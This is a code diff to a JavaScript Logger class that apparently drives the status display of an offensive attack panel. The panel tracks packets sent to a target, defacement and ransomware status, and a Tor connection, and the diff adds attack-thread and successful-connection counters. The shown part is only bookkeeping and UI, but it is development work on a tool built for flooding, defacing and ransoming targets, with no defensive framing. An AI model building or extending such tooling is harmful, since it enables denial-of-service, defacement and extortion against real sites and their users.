@@ -18,7 +18,9 @@ class Logger {
             errors: 0,
             defacementStatus: 'Idle',
             ransomwareStatus: 'Idle',
-            torConnectionStatus: 'Disconnected'
+            torConnectionStatus: 'Disconnected',
+            attackThreads: 0,
+            successfulConnections: 0
         };
         this.initializeUI();
     }
@@ -146,22 +148,29 @@ class Logger {
         URL.revokeObjectURL(url);
     }
 
-    startAttack(target, attackType) {
+    startAttack(target, attackType, threads) {
          this.stats.startTime = new Date().toISOString();
-         this.updateStats(0, 0, 'Attacking', attackType, target);
+         this.stats.attackThreads = threads;
+         this.updateStats(0, 0, 'Attacking', attackType, target, threads);
     }
 
     endAttack() {
         this.stats.endTime = new Date().toISOString();
-        this.updateStats(this.stats.packetsSent, this.stats.bytesSent, 'Idle', 'None', 'None');
+        this.updateStats(this.stats.packetsSent, this.stats.bytesSent, 'Idle', 'None', 'None', 0);
     }
 
-    updateStats(packets, bytes, status, attackType, target) {
+    updateStats(packets, bytes, status, attackType, target, threads) {
         this.stats.packetsSent += packets;
         this.stats.bytesSent += bytes;
         this.stats.connectionStatus = status;
         this.stats.lastAttackType = attackType;
         this.stats.target = target;
+        this.stats.attackThreads = threads;
+        this.displayStats();
+    }
+
+    incrementSuccessfulConnections() {
+        this.stats.successfulConnections++;
         this.displayStats();
     }
 
@@ -178,6 +187,8 @@ class Logger {
         document.getElementById('defacement-status').textContent = this.stats.defacementStatus;
         document.getElementById('ransomware-status').textContent = this.stats.ransomwareStatus;
         document.getElementById('tor-connection-status').textContent = this.stats.torConnectionStatus;
+        document.getElementById('attack-threads').textContent = this.stats.attackThreads;
+        document.getElementById('successful-connections').textContent = this.stats.successfulConnections;
     }
 
     getStats() {
